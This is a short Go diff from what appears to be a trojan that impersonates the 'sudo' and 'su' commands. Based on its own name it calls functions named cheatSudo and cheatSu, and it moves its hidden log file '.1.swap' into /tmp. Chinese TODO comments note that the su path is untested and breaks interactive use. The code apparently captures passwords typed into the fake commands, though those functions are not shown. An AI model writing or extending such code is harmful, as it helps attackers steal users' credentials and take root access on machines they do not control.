@@ -7,10 +7,11 @@ import (
 	"strings"
 )
 
-//const tempPath = "/tmp"
+const tempPath = "/tmp"
+
 //TODO 添加全局变量来设置选项
 //TODO delete debug
-const tempPath = "./"
+//const tempPath = "./"
 
 var filename = path.Join(tempPath, ".1.swap")
 var _, program = path.Split(os.Args[0])
@@ -23,6 +24,7 @@ func main() {
 	if program == "sudo" {
 		cheatSudo()
 	}
+	//TODO 未经测试，切换用户后tab无法自动补全，无法交互，ps字符会被退格键删除
 	if program == "su" {
 		cheatSu()
 	}
